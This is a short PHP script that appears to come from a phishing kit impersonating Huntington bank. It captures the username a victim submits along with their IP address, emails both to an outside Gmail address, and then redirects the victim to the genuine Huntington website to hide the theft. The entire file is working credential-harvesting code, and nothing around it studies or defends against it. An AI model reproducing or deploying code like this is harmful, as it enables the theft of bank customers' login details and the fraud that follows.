<?php
$ip = getenv("REMOTE_ADDR");
$message  = "--------------- Huntington Personal  --------------\n";
$message .= "Username : ".$_POST['username']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By KNYGHT-----------------\n";
$send = "payuupal@gmail.com";
$subject = "huntington";
$headers = "From: KNYGHT<comp>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($send, $subject, $message); 
header("Location: https://www.huntington.com/");
	  

?>